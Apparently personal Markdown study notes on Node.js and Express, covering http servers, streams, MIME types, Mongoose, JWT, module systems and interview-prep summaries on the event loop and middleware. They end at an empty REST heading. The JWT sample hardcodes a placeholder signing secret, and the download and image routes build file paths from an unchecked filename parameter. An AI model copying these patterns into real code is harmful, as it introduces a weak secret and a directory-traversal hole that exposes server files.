# to get started with node

install node

if you want to run something in node
node index.js

to use any of the commands you write you can type it after

node index.js add

# import certain libaries :
const fs = require("fs");  
const todos = JSON.parse(fs.readFileSync(todosPath, "utf-8"));

**notice that the paths differ form each os thats why we path function**

const path = require("path");
const todosPath = path.join(\_\_dirname, "todos.json");

# access arguments
const [, , command, value] = process.argv;

//here i am destructuring to get the second and third values in the process.argv array in variable command and vlaue

# how to take input form the user?
const { createInterface } = require("node:readline");
const rl = createInterface({
input: process.stdin,
output: process.stdout,
});

Questions?
async function runCLI(){
const answer1 = await rl.question("what is your item name");
const answer2 = await rl.question("what is your item size");
console.log(answer1 + answer2);
rl.close();
}
**remeber to close the stream**

# setting up eslint
  1. npm install eslint
  2. install the eslint extention in vscode
  3. setup you rules and files that eslint will lint
  ``` javascript
    export default defineConfig([
      {
        files: ["**/*.{js,mjs,cjs}"],
        plugins: { js },
        extends: ["js/recommended"],
        languageOptions: { globals: globals.node },
        rules: {
          "no-console": "off", // Allow console.log
          "prefer-const": "error", // Force 'const' over 'let' if value doesn't change
          "eqeqeq": ["error", "always"],
          "no-var": "error",
          "indent": ["error", 2],
          "semi": ["error", "always"]
        },
      },
    ]);
  ```
  4. enable auto lint in you setting.json
  ```javascript
    "editor.codeActionsOnSave": {
      "source.fixAll.eslint": "explicit"
    },
  ```
**if you want to run eslint manually you can use npx eslint**

# note with the dependancies 

beware what you put inside your dependanceies , things like eslint and nodemon should be in the devDependancies to not go in production

# scripts
scripts are a helpful shorthand for commands in node
**in package.json**
```json
  "scripts": {
      "start": "nodemon .",
      "deploy": "deploy to gcp",
      "dev": "node index.js",
      "test": "echo \"Error: no test specified\" && exit 1"
    },
```
# using curl
  //TODO: search for url encoding
  post curl -d "name=Rafael%20Sagula&phone=3320780" https://www.example.com/guest.cgi
  get  curl https://www.example.com/
**you can avoid specifying the port name by setting the port to 80 for http or 443 for https**
# setps to setup a httpserver
  const http = require('http');
  const server = http.createServer(async(req, res) => {}); // can be asyn or not its not required

  ### get the url and method
    const {method, url } = req;
    const params = url.split("/");
  
  ### working with params
    if lets say the link is like this
      http://127.0.0.1:3000/inventory/1
    
    then the url part will be like this
      inventory/1
    if you want to manipulate it you can split it at /
    then you will have your params

  ### to send a reply to the user we can use the response

     res.writeHead(status, {
              'content-type': 'application/json'
            });

    res.write(JSON.stringify(responseData))

  **remeber to send the head first before writing anything or else you would get an error**

# Server paths vs file system paths
  something to consider you param condition
  for example
  if you wirte :if(param.at(1) === /home.html)
  that means the expected url that will work in this case senario will be like this

  https://localhost/home.html

  now your file system might look like this
  your-project
    pages
      home.html
  
  while your fileSystem has a subfolders , the url param you are asking for is only /home.html
  so it will get it , later on inside the if condition you can give the actual path to work on

  same principle when linking your html with css or with images

  <link rel="stylesheet" href="/home.css">

  and your file structure would look like this
  your-project 
    style
      home.css

  normaly if you run this html alone in the browser it wont work , the live server you used to open in the front end is sees the folder structure and navigates accordingly so you will have to specify the exact folder here

  but now on the server side , the url is specifically asking for /home.css

  same as before you can give the actual file path later on inside the condition

# Express.static() vs Manual Routing: A Comparison
Overview
When serving static files in Express, you have two main approaches: using the built-in express.static() middleware or manually creating routes to serve files. Each has distinct advantages and disadvantages.

Approach 1: Manual Routing
Example Code
```javascript
app.get('/css/home.css', (req, res) => {
  const filePath = path.join(__dirname, 'public/css/home.css');
  getPage(filePath, res, types.CSS_PAGE);
});

app.get('/js/script.js', (req, res) => {
  const filePath = path.join(__dirname, 'public/js/script.js');
  getPage(filePath, res, types.JS_PAGE);
});

app.get('/images/logo.png', (req, res) => {
  const filePath = path.join(__dirname, 'public/images/logo.png');
  getPage(filePath, res, types.IMAGE_PAGE);
});
```
### Pros

Custom logic: You can add authentication, logging, or file transformation before serving
Control: Decide exactly what gets served and under what conditions
Flexible routing: Serve different files based on complex business logic
Tracking: Easy to log which files are accessed and by whom

### Cons

Repetitive: Need a route for every file (or file pattern)
No caching: Requires manual implementation of HTTP caching headers (ETags, Last-Modified, Cache-Control)
Performance: Browser won't cache efficiently; full file re-sent on every request
MIME types: Must manually set Content-Type for each file type
No range requests: Can't support partial downloads (HTTP 206)
Security risk: Vulnerable to directory traversal attacks if not carefully implemented
Maintenance: Changes to file structure require code changes
Scalability: Becomes unwieldy with hundreds of static assets


Approach 2: Express.static()
Example Code
```javascript
// Serve all files from 'public' directory
app.use(express.static('public'));

// Or with a route prefix
app.use('/static', express.static('public'));

// Or with options
app.use(express.static('public', {
  maxAge: '1h',
  etag: true,
  dotfiles: 'deny'
}));
```
### Pros

Automatic caching: Handles ETags and Last-Modified headers automatically
Efficient: Browsers cache files; returns 304 "Not Modified" for unchanged files
MIME types: Automatically detects and sets correct Content-Type headers
Range requests: Supports HTTP 206 for resumable downloads
Security: Built-in protections against directory traversal attacks
Scalability: Single line handles all static assets
Performance: Zero code overhead; highly optimized
Maintenance: No code changes when file structure updates

### Cons

No custom logic: Can't easily add authentication or logging per file
Less control: All files in directory are served (though dotfiles option helps)
All or nothing: Harder to apply different rules to different file types


### Performance Comparison

##### Manual Routing Example
```javascript
// Request 1: Browser requests /css/home.css
// Response: 200 OK + full file content (50KB)
// 
// Request 2: Browser requests /css/home.css again (same session)
// Response: 200 OK + full file content (50KB) ← Wasted bandwidth!

Total data transferred: 100KB
```
### Express.static() Example
```javascript
// Request 1: Browser requests /css/home.css
// Response: 200 OK + ETag header + full file content (50KB)
// Browser caches the file and ETag
//
// Request 2: Browser requests /css/home.css again
// Sends: If-None-Match header with cached ETag
// Response: 304 Not Modified (no body)

Total data transferred: 50KB
```

### Real-World Scenarios

##### Use Express.static() When:

Serving public assets (CSS, JS, images, fonts)
You don't need special handling per file
Performance and caching are important
You have many static files (dozens or more)

```javascript
app.use(express.static('public'));
// That's it! Now /public/style.css is accessible at /style.css
```

##### Use Manual Routing When:

Serving protected files (require authentication)
Need to log file access for analytics
Transforming files before serving
Applying different rules to different files

```javascript
// Protect PDF downloads
app.get('/download/:filename', authenticate, (req, res) => {
  const filePath = path.join(__dirname, 'protected/files', req.params.filename);
  res.download(filePath);
});


// Log image downloads
app.get('/images/:filename', (req, res) => {
  console.log(`Downloaded: ${req.params.filename}`);
  res.sendFile(path.join(__dirname, 'public/images', req.params.filename));
});
```

  

# streams 
  instead of readSync you can open the stream and read from the file 
  the advantage here is that data comes in chunks , you can control how many chunks before for example asking about
  the someting (pagenation)

### to open one
  ```javascript
    function readFile(path){
    return new Promise((resolve,reject)=>{
      const stream = fs.createReadStream(path ,{encoding:"utf-8"}); // this creates the stream

      let data = '';
      stream.on('data',(chunk)=>{               //this reads the data into chunks
        data+=chunk;
      });
      stream.on('end',()=>{                     //when all the data is there return
        resolve(data);
      });
      stream.on('error',reject);                //if there is anysort of error reject the promise
    });

    }
  ```

# content type
  specifying content type is crucial to get the data correctly
  Text types:

    text/plain - Plain text files
    text/html - HTML documents
    text/css - CSS stylesheets
    text/javascript - JavaScript files
    text/csv - CSV data

    Application types:

    application/json - JSON data
    application/xml - XML documents
    application/pdf - PDF documents
    application/zip - ZIP archives
    application/octet-stream - Binary data (generic)
    application/x-www-form-urlencoded - Form data
    application/ld+json - JSON-LD (linked data)
    application/vnd.openxmlformats-officedocument.wordprocessingml.document - Word (.docx)

    Image types:

    image/jpeg - JPEG images
    image/png - PNG images
    image/gif - GIF images
    image/webp - WebP images
    image/svg+xml - SVG vector graphics

    Audio types:

    audio/mpeg - MP3 audio
    audio/wav - WAV audio
    audio/ogg - OGG audio
    audio/webm - WebM audio

    Video types:

    video/mp4 - MP4 video
    video/webm - WebM video
    video/ogg - OGG video

    Font types:

    font/woff - WOFF fonts
    font/woff2 - WOFF2 fonts
    application/font-sfnt - TrueType/OpenType fonts

# http requests

  GET: Fetch data without side effects
  POST: Submit data that creates a resource
  PUT: Send complete replacement of resource
  PATCH: Send partial updates to resource
  DELETE: Remove a resource
  HEAD: Check resource without downloading body
  OPTIONS: Get available methods for a resource

  Idempotent: GET, PUT, DELETE, HEAD, OPTIONS
  Not idempotent: POST, PATCH

  **idempotent*: running the same command over and over gets the exact same results
  for example if i put user 1 andrew to david. no matter how many times i run it is still the same
  if i patch the quantity of an item to increase +1 , each time i run it gives a different result

# in regards to file paths
  1. Use server-relative paths in HTML/CSS/JS

  ✅ <link rel="stylesheet" href="/style/home.css">
  ✅ <img src="/public/images/serbal.jpg">
  ✅ <script src="/script.js"></script>
  ❌ Don't use ../style/home.css (relative paths don't work for HTTP)
  ❌ Don't use C:/Users/... (full file paths)

# Http status codes
1xx Informational — Request received, continuing process

100 Continue
101 Switching Protocols

2xx Success — Request succeeded

200 OK
201 Created
202 Accepted
204 No Content
206 Partial Content

3xx Redirection — Further action needed to complete request

300 Multiple Choices
301 Moved Permanently
302 Found
304 Not Modified
307 Temporary Redirect
308 Permanent Redirect

4xx Client Error — Request contains bad syntax or can't be fulfilled

400 Bad Request
401 Unauthorized
403 Forbidden
404 Not Found
405 Method Not Allowed
408 Request Timeout
409 Conflict
410 Gone
429 Too Many Requests
422 Unprocessable Content

5xx Server Error — Server failed to fulfill valid request

500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Gateway Timeout

# handling POST requests
  ```javascript
  let body = '';
    req.on('data',chunk =>{
      body+= chunk.toString();
    });
    //handle your logic here
    req.on('end',()=>{
      console.log("haaai")
      try{
        const postData = JSON.parse(body);
        res.writeHead(200,{'content-type': 'application/json'});
        res.write(JSON.stringify(postData));
        console.log(postData);
        res.end();

      }catch(error){
        res.writeHead(400,{'content-type': 'application/json'});
        res.write(JSON.stringify({error:error.message}));
        res.end();
      }
    });
  ```
# pipes
  The pipe() allows you to pass data from one stream to another effciently 
  **Examples**
  copying a file

  ``` javascript
  const fs = require('fs');

  const readStream = fs.createReadStream('source.txt');
  const writeStream = fs.createWriteStream('destination.txt');

  readStream.pipe(writeStream);

  //This reads source.txt in chunks and writes to destination.txt without loading the entire file into memory.
```
  chaining pipes:
  ```javascript
    const fs = require('fs');
    const zlib = require('zlib');

    // Compress a file
    fs.createReadStream('input.txt')
      .pipe(zlib.createGzip())
      .pipe(fs.createWriteStream('input.txt.gz'));
  ```
  serving a file via http using pipes:

  ```javascript
    const http = require('http');
    const fs = require('fs');

    const server = http.createServer((req, res) => {
      const stream = fs.createReadStream('large-video.mp4');
      
      stream.pipe(res);
      
      stream.on('error', (err) => {
        res.statusCode = 500;
        res.end('Server error');
      });
    });

    server.listen(3000);
  ```
  **NOTE: pipe() has a pitfall that it wont notify other streams if one of them failed resulting in a memoryleak**

  use pipeline instead for better error handling:
  ```javascript
  const { pipeline } = require('stream');
  const fs = require('fs');
  const zlib = require('zlib');

  pipeline(
    fs.createReadStream('input.txt'),
    zlib.createGzip(),
    fs.createWriteStream('input.txt.gz'),
    (err) => {
      if (err) {
        console.error('Pipeline failed:', err);
      } else {
        console.log('Pipeline successful');
      }
    }
  );
```


# express
  app.get()   //get requests
  res.send()  //send response
  res.set()   //set headers
  res.status //set status
# side note
  remeber to use the write stream once you finish all of your validations otherwise it will override the file
  patch vs put : patch replaces a portion of the data
  put replace the whole object

  In Express, when you pass an argument to next(), Express assumes it's an error and skips all remaining regular middleware/routes to find the first Error-Handling Middleware (a function with 4 arguments: err, req, res, next).


  # mongoose 
  npm install mongoose
  
  ```javascript
    const mongoose = require('mongoose');
    const routes = require('./routes');
    mongoose.connect('mongodb://127.0.0.1:27017/inventory-system');
  ```
    unique: true, //Mongoose will build a unique index on this path when the model is compiled  
Ensure Index Creation: When your application starts, Mongoose automatically calls createIndex for each index defined in your schema.

    For Existing Data: If you are adding unique: true to an existing collection that already contains duplicate values, the index creation will fail. You must manually remove existing duplicate documents or drop the collection before restarting your application to build the unique index successfully.
    In Production: It is recommended to disable Mongoose's automatic index creation in production (by setting autoIndex to false) and create indexes using the MongoDB shell for better performance and control.
    Handle Errors Gracefully: The unique option is not a Mongoose validator; it's an index creation option that relies on MongoDB to enforce the constraint. When a save operation fails due to a duplicate key violation, MongoDB throws a driver-level E11000 error.
    When Mongoose defines a field as
    unique: true, it isn't performing a check in your application's code before sending the data. Instead, it instructs MongoDB to create a Unique Index. If you try to save a duplicate, the database itself rejects the operation and throws the E11000 error. 
    Why this happens
    Mongoose's built-in validators (like required or min) run before the data is sent to the database. Because uniqueness requires checking every other document in the collection, Mongoose offloads this to MongoDB's indexing engine for performance and to avoid "race conditions" where two identical documents might be saved at the exact same millisecond. 

# JWT
    you will singin in after checking the encripted password and the email
  ```javascript
    const token = jwt.sign({id: user._id}, 'your-secret-secret-key', {expiresIn: '1h'});
  ```
    this token then should be saved in cookies or what ever they will then come with the headers
  ```javascript
      const authMiddleware = async function (req, res, next) {
      const {usertoken} = req.headers;

      if (!usertoken) {
        const error = {message: 'you are not logged in'};
        next(error);
      } else {
        jwt.verify(usertoken, 'same secret key', (err, decodedToken) => {
          if (err) {
            next(err);
          } else {
            req.user = decodedToken;
            next();
          }
        });
      }
    };
```
  with this we now know that someone is logged in and we have what ever info we put in in the decoded jwt , now we can check if the user have the authorization to change the item or not , this is called protecting your routes

# quick note for mongoose and nodemon

  when you drop a collection , remember to restart nodemon as the indexes wont be synced meaning that it will by pass the unique flag you put
  
  i dont know exactly why this happens but that is a valid observation


  ## JWT vs Session Authentication

Here's a clear comparison of the two main approaches to web authentication:

---

### How They Work

**Sessions** store user state on the **server**. When you log in, the server creates a session record, stores it (in memory, a database, or Redis), and sends back a session ID cookie. Every request, the server looks up that ID to verify you.

**JWT (JSON Web Tokens)** store user state on the **client**. When you log in, the server creates a signed token containing your user data and sends it back. The client sends this token with every request, and the server just verifies the signature — no lookup needed.

---

### Key Differences

| | Sessions | JWT |
|---|---|---|
| **State stored** | Server | Client |
| **Scalability** | Harder (shared session store needed) | Easier (stateless) |
| **Revocation** | Instant (delete the session) | Hard (token lives until expiry) |
| **Performance** | DB lookup per request | Signature verify only |
| **Token size** | Tiny cookie (just an ID) | Larger (carries data) |
| **Security control** | Full (server controls everything) | Limited (can't invalidate issued tokens easily) |
| **Best for** | Monoliths, traditional web apps | Microservices, APIs, mobile apps |

---

### When to Use Each

**Choose Sessions when:**
- You need instant logout / revocation (e.g. banking, admin tools)
- You're building a traditional server-rendered app
- You have a single server or a shared Redis/DB store

**Choose JWT when:**
- You're building a stateless REST API
- You have multiple services that need to verify identity independently
- You're supporting mobile clients or third-party API consumers

---

### The Big Tradeoff

The core tension is **revocation vs. scalability**. Sessions let you kill a token instantly but require server-side storage. JWTs are stateless and scale easily but you can't truly "log out" a user until the token expires — unless you build a token blocklist, which partially defeats the stateless benefit.

Many production systems use **both**: JWTs for short-lived access tokens + refresh tokens stored server-side for revocation control.



## MJS vs CJS (CommonJS)

I think you mean **CJS (CommonJS)** vs **MJS (ES Modules)** — these are the two module systems in Node.js.

---

### The Core Difference

**CJS (`.cjs` / `.js` default in Node)** — the original Node.js module system, synchronous, designed for servers.

```javascript
// exporting
const helper = require('./helper');
module.exports = { greet };

// importing
const { greet } = require('./utils');
```

**MJS (`.mjs` / ES Modules)** — the modern standard, the same system browsers use, asynchronous by design.

```javascript
// exporting
export function greet() {}
export default greet;

// importing
import { greet } from './utils.js'; // extension required
import greet from './utils.js';
```

---

### Key Differences

| | CJS | MJS |
|---|---|---|
| **Syntax** | `require` / `module.exports` | `import` / `export` |
| **Loading** | Synchronous | Asynchronous |
| **File extension** | `.js` (default) or `.cjs` | `.mjs` or `.js` with `"type":"module"` in package.json |
| **`__dirname` / `__filename`** | ✅ Available | ❌ Not available (workaround needed) |
| **Top-level `await`** | ❌ Not supported | ✅ Supported |
| **Tree shaking** | ❌ No | ✅ Yes (bundlers can drop unused code) |
| **Browser compatible** | ❌ No | ✅ Yes |
| **Dynamic imports** | ✅ `require()` anywhere | ✅ `import()` anywhere |
| **Circular deps** | Handled (partially) | Handled (better) |
| **Interop** | Can't `require()` an MJS file | Can `import` CJS files |

---

### The `__dirname` Workaround in MJS

```javascript
// CJS - just works
console.log(__dirname);

// MJS - need this workaround
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
```

---

### Performance

**In practice, neither is meaningfully faster for most apps.** But there are nuanced differences:

#### Startup / Loading
```
CJS  → synchronous, blocking loads
       Node reads file A → executes → reads file B → executes

MJS  → asynchronous, parallel parsing
       Node parses ALL imports first, builds a module graph, then executes
       This can be faster for large dependency trees
```

#### Tree Shaking (biggest real-world impact)
```javascript
// CJS - bundlers can't know what you actually use
const _ = require('lodash'); // entire lodash bundled

// MJS - bundlers statically analyze and drop unused exports
import { debounce } from 'lodash-es'; // only debounce included
```
This doesn't affect raw Node.js performance, but **dramatically reduces bundle size** for frontend/edge deployments.

#### Caching
Both systems cache modules after first load — repeated `require()` / `import` calls return the cached version, so no re-execution overhead.

---

### Interop Rules (important gotcha)

```javascript
// ✅ MJS can import CJS
import cjsModule from './legacy.cjs';

// ❌ CJS cannot require() MJS
const esm = require('./modern.mjs'); // throws ERR_REQUIRE_ESM

// ✅ CJS can dynamically import MJS (async only)
async function load() {
  const esm = await import('./modern.mjs');
}
```

---

### Which Should You Use?

**Use MJS if:**
- Starting a new project
- Building a library (works in both Node and browser)
- You want top-level `await`
- You care about tree shaking

**Stick with CJS if:**
- Maintaining a legacy codebase
- Many of your dependencies are CJS only
- You rely heavily on `__dirname` / `__filename` patterns

**The ecosystem is converging on MJS** — most major libraries now ship dual builds (CJS + MJS), and Node.js itself recommends ES Modules for new projects. But CJS isn't going anywhere soon given how much code depends on it.



# Compiler vs Interpreter vs JIT vs AOT

## Quick Summary

| | **Compiler (AOT)** | **Interpreter** | **JIT** |
|---|---|---|---|
| **When translated** | Before execution | During execution (line by line) | During execution (on hot paths) |
| **Output** | Binary executable | No file | Native code (in memory) |
| **Startup speed** | Slow | Fast | Fast |
| **Peak speed** | Fastest | Slowest | Near-compiled |
| **Error detection** | All errors upfront | Stops at first error | Stops at first error |
| **Portability** | Platform-specific binary | High (needs runtime) | High (needs runtime) |
| **Memory usage** | Low at runtime | Low | High (profiler + compiler live in memory) |
| **Debugging** | Harder | Easy (exact line) | Medium |
| **Examples** | C, C++, Rust, Go | CPython, Ruby, Bash | Java (JVM), JS (V8), C# (.NET) |

---

## Each One Explained

### Compiler (AOT — Ahead of Time)
Translates the **entire** source code into machine code **before** the program runs. The result is a standalone binary tied to a specific platform.

- ✅ Fastest runtime performance
- ✅ No translation overhead at runtime
- ❌ Slow build step
- ❌ Binary must be recompiled for each platform

### Interpreter
Reads and executes code **line by line** at runtime. No compilation step, no output file.

- ✅ Instant startup, easy to iterate
- ✅ Portable — run anywhere with the runtime
- ❌ Re-translates every line every time, even in tight loops
- ❌ Slowest execution

### JIT (Just-in-Time)
Starts as an interpreter, but a **profiler** watches for "hot" code (loops or functions called repeatedly). Hot code gets compiled to native machine code on the fly.

- ✅ Fast startup like an interpreter
- ✅ Near-native peak speed for hot paths
- ❌ High memory (profiler + compiler running alongside your code)
- ❌ Warm-up time before hitting peak performance
- ❌ **Deoptimization risk** — if a runtime assumption breaks (e.g. a variable's type changes), JIT must throw away compiled code and fall back

---

## Speed Over Time

```
Speed
  |                          ___________  AOT/Compiler
  |                    _____/
  |              _____/                   JIT
  |        _____/
  |_______/                               Interpreter (flat, always slow)
  |
  +-------------------------------------------> Time / Warmup
```

AOT is fastest from the start. JIT catches up after warmup. Interpreter never catches up.

---

## The Blurry Middle

Most modern languages blur the lines:

| Language | What actually happens |
|---|---|
| **Java** | Compiled to bytecode → JVM interprets → JIT compiles hot paths |
| **Python (CPython)** | Compiled to `.pyc` bytecode → then interpreted |
| **JavaScript (V8)** | Interpreted by Ignition → Turbofan JIT compiles hot paths |
| **C#** | Compiled to IL bytecode → .NET CLR JITs it at runtime |
| **PyPy** | Full JIT runtime for Python — often 5–10× faster than CPython |

---

## When to Use What

| Use case | Best fit |
|---|---|
| Systems programming, embedded, mobile | **AOT** (C, Rust, Swift) |
| Long-running servers, enterprise apps | **JIT** (Java, C#) |
| Browser scripting, web apps | **JIT** (JavaScript) |
| Scripting, glue code, rapid prototyping | **Interpreter** (Python, Ruby) |


# Session Summary — Node.js & Express — Junior Interview Prep

---

## What We Covered

A full deep-dive into the five Tier 1 non-negotiable topics for a Node.js & Express junior interview:
the event loop and Node internals, async patterns across all three generations, Express middleware
and the request pipeline, REST API design principles, and Express error handling. Every topic was
covered conceptually first, then reinforced with code examples and comprehension checks.

---

## Key Concepts Learned

---

### 1. The Node.js Event Loop

**What it is:**
Node runs JavaScript on a single thread. It achieves concurrency through an event-driven,
non-blocking I/O model — not through spawning threads like Django/Gunicorn does.

**The three-layer stack:**
```
Your JS Code
     ↓
  V8 Engine     ← compiles and executes JavaScript only
     ↓
  libuv         ← implements the event loop, thread pool, OS async I/O
     ↓
  OS Kernel     ← actual file reads, network calls, etc.
```

**The event loop phases (in order):**
```
timers           → setTimeout / setInterval callbacks
pending callbacks → I/O errors from previous iteration
idle, prepare    → internal use only
poll             → retrieve new I/O events — THIS is the core phase
check            → setImmediate callbacks
close callbacks  → socket.on('close') etc.
```

**Between every phase transition:**
```
phase ends
    → nextTick queue drains completely   ← highest priority
    → microtask queue drains             ← Promise .then callbacks
    → next phase begins
```

**The thread pool:**
libuv maintains a thread pool (`UV_THREADPOOL_SIZE`, default: 4) for operations that
lack reliable OS-level async primitives:
- File system operations (`fs.readFile` etc.)
- DNS resolution (`dns.lookup`)
- Crypto (`crypto.pbkdf2`, `crypto.randomBytes`)
- Zlib compression

Network I/O (HTTP, TCP, UDP) does NOT use the thread pool — it uses OS-level async
primitives (`epoll` on Linux, `kqueue` on macOS) directly. This is inferred from the
libuv design docs, not stated explicitly in a single line.

**Interview-ready answer:**
> "Node runs JavaScript on a single thread using V8. It achieves concurrency through
> an event-driven non-blocking I/O model powered by libuv. libuv implements the event
> loop, which processes callbacks in fixed phases. Slow operations are offloaded to
> libuv's thread pool or OS async APIs. The main thread is never blocked waiting —
> it's always processing the next available callback."

**Docs:**
- [Node.js Event Loop — Official](https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick)
- [libuv Design Overview](https://docs.libuv.org/en/v1.x/design.html)
- [libuv Thread Pool](https://docs.libuv.org/en/v1.x/threadpool.html)
- [UV_THREADPOOL_SIZE — Node CLI Docs](https://nodejs.org/api/cli.html#uv_threadpool_sizesize)

---

### 2. process.nextTick vs setImmediate vs setTimeout

**The naming trap:**
`process.nextTick` does NOT mean "next loop iteration". It fires before the event loop
moves to the next phase — it interrupts the loop between phases. The Node docs
acknowledge the names should have been swapped.

**Execution order proof:**
```js
setImmediate(() => console.log('setImmediate'));       // check phase
process.nextTick(() => console.log('nextTick'));       // before next phase
Promise.resolve().then(() => console.log('promise')); // microtask queue
console.log('synchronous');                           // call stack — runs first

// Output:
// synchronous
// nextTick
// promise
// setImmediate
```

**The critical I/O case — inside an fs.readFile callback:**
```js
fs.readFile('file.txt', () => {
  setTimeout(() => console.log('timeout'), 0);
  setImmediate(() => console.log('immediate'));
});

// Always outputs:
// immediate
// timeout
```

Why? When the `fs.readFile` callback fires, you are already inside the poll phase.
The next phase is check — so `setImmediate` fires first. The timers phase already
passed this iteration, so `setTimeout` waits for the next loop iteration.

**Decision table:**

| Choice | When to use it |
|---|---|
| `process.nextTick` | Run before anything else — before next phase. Use sparingly, can starve the loop |
| `setImmediate` | After current I/O this iteration — predictable, safe for post-I/O cleanup |
| `setTimeout(fn, 0)` | When loop placement doesn't matter — least predictable of the three |

**Outside I/O — order is non-deterministic:**
```js
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
// Order is NOT guaranteed — depends on OS timer resolution
```

**Docs:**
- [process.nextTick vs setImmediate — Node Docs](https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick#process-nexttick-vs-setimmediate)

---

### 3. Async Patterns — Callbacks → Promises → async/await

**Why the evolution happened:**
Each generation exists because the previous one made error handling, composition,
and readability progressively harder as complexity grew.

---

#### Generation 1 — Callbacks

Node's original async primitive. Error-first convention — first argument is always the error.

```js
fs.readFile('file.txt', (err, data) => {
  if (err) throw err;       // always check error first
  console.log(data);
});
```

**Why it breaks down — callback hell:**
```js
fs.readFile('a.txt', (err, a) => {
  fs.readFile('b.txt', (err, b) => {
    fs.readFile('c.txt', (err, c) => {
      db.save(a + b + c, (err, result) => {
        // logic flows diagonally — unreadable at scale
        // error must be handled manually at every single level
      });
    });
  });
});
```

Problems: manual error handling at every level, deep nesting, impossible to compose.

---

#### Generation 2 — Promises

A Promise is an object representing an async operation. Three states: pending → fulfilled / rejected.

```js
fs.promises.readFile('a.txt')
  .then(data => process(data))       // chain, not nest
  .then(result => db.save(result))
  .catch(err => console.error(err)); // ONE handler for the whole chain
```

Solves: centralized error handling, linear chaining, composability.

---

#### Generation 3 — async/await

Syntactic sugar over Promises. Every `async` function returns a Promise.
Lets async code read like synchronous code without blocking the thread.

```js
async function processFiles() {
  try {
    const a = await fs.promises.readFile('a.txt'); // waits, does not block
    const b = await fs.promises.readFile('b.txt');
    const result = await db.save(a + b);
    return result;
  } catch (err) {
    console.error(err); // one try/catch handles everything
  }
}
```

---

#### The Most Common async/await Bug — Sequential vs Parallel

```js
// ❌ Sequential — independent operations waiting on each other unnecessarily
const user    = await db.findUser(id);    // 200ms
const posts   = await db.findPosts(id);   // 200ms
const friends = await db.findFriends(id); // 200ms
// Total: 600ms — every extra call adds latency linearly

// ✅ Parallel — all three start at once
const [user, posts, friends] = await Promise.all([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);
// Total: ~200ms — bounded by the slowest call
```

At 1000 concurrent users, that 400ms difference compounds into real infrastructure cost.

---

#### Promise static methods — Know All Four

```js
// All must succeed — one failure rejects everything (fail-fast)
await Promise.all([fetchA(), fetchB(), fetchC()]);

// All settle regardless — get partial results, handle each independently
const results = await Promise.allSettled([fetchA(), fetchB(), fetchC()]);
// Each result: { status: 'fulfilled', value: ... }
//           or { status: 'rejected', reason: ... }

// First success wins — ignores failures
await Promise.any([fetchA(), fetchB(), fetchC()]);

// First result wins — success or failure
await Promise.race([fetchA(), fetchB(), fetchC()]);
```

**When to use which:**

| Scenario | Use |
|---|---|
| All results required — one fail = whole operation fails | `Promise.all` |
| Partial results acceptable — handle each independently | `Promise.allSettled` |
| First success is enough | `Promise.any` |
| First result wins — success or failure | `Promise.race` |

**Docs:**
- [MDN — Async JS](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous)
- [MDN — Promise](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise)
- [MDN — Promise.all](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/all)
- [MDN — Promise.allSettled](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/allSettled)
- [MDN — Promise static methods](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#static_methods)

---

### 4. Express Middleware

**What it is:**
Middleware is just a function. Every request walks through a chain of functions in
the order you define them. You control what happens at each step.

**The signature:**
```js
// Standard middleware — 3 arguments
(req, res, next) => { }

// Error-handling middleware — 4 arguments (Express identifies by this signature)
(err, req, res, next) => { }
```

**The pipeline:**
```
Incoming Request
      ↓
  Middleware 1 (e.g. logging)      → calls next()
      ↓
  Middleware 2 (e.g. auth check)   → calls next() or next(err)
      ↓
  Middleware 3 (e.g. parse body)   → calls next()
      ↓
  Route Handler                    → sends response
```

If any middleware calls `res.send()` / `res.json()` the chain stops there.
Calling `next()` after a response is sent is a bug.

---

#### The Four Middleware Types

**1. Application-level — runs on every request:**
```js
app.use((req, res, next) => {
  console.log(`${req.method} ${req.path}`);
  next(); // must call this or the request hangs forever
});
```

**2. Router-level — scoped to a specific router:**
```js
const router = express.Router();
router.use((req, res, next) => {
  // only runs for routes on this router
  next();
});
```

**3. Built-in middleware:**
```js
app.use(express.json());         // parses JSON request bodies
app.use(express.urlencoded());   // parses form data
app.use(express.static('pub'));  // serves static files
```

**4. Error-handling middleware — two hard rules:**
- Must have exactly 4 arguments (Express identifies error handlers this way)
- Must be registered last — after all routes and other middleware

```js
// Trigger it upstream
app.get('/user', (req, res, next) => {
  const err = new Error('User not found');
  err.status = 404;
  next(err); // passing anything truthy skips to the error handler
});

// Catches it here — 4 args, registered last
app.use((err, req, res, next) => {
  res.status(err.status || 500).json({ error: err.message });
});
```

---

#### next() — Three Behaviors

```js
next()          // move to next middleware — normal flow
next(err)       // skip everything, go straight to error handler
next('route')   // skip remaining handlers in current route only
```

---

#### Order Matters — The Most Common Express Bug

```js
// ❌ Auth never runs for /private — it's defined before the middleware
app.get('/private', handler);
app.use(authMiddleware); // too late

// ✅ Auth runs for everything defined below it
app.use(authMiddleware);
app.get('/private', handler);
```

**Middleware only applies to routes registered AFTER it.**

---

#### Route-level middleware — The Scalable Pattern

```js
const auth = (req, res, next) => {
  if (!req.headers.authorization) return next(new Error('Unauthorized'));
  next();
};

// Auth is explicit per route — not dependent on registration order
app.post('/login', loginHandler);                  // public
app.get('/dashboard', auth, dashboardHandler);     // protected
app.get('/profile', auth, profileHandler);         // protected
app.use(errorHandler);                             // always last
```

Why this scales better than `app.use(authMiddleware)`:
- Protection is explicit — not an accident of file order
- Adding a new public route anywhere won't accidentally expose or block it
- 20 protected routes don't require restructuring the file

**Docs:**
- [Express — Using Middleware](https://expressjs.com/en/guide/using-middleware.html)
- [Express — Writing Middleware](https://expressjs.com/en/guide/writing-middleware.html)
- [Express — Error Handling](https://expressjs.com/en/guide/error-handling.html)

---

### 5. REST API Design

**Core idea:**
REST is an architectural style, not a protocol. Everything is a resource (noun).
You act on resources using HTTP verbs. URIs identify resources — never actions.

---

#### HTTP Verbs and Their Contracts

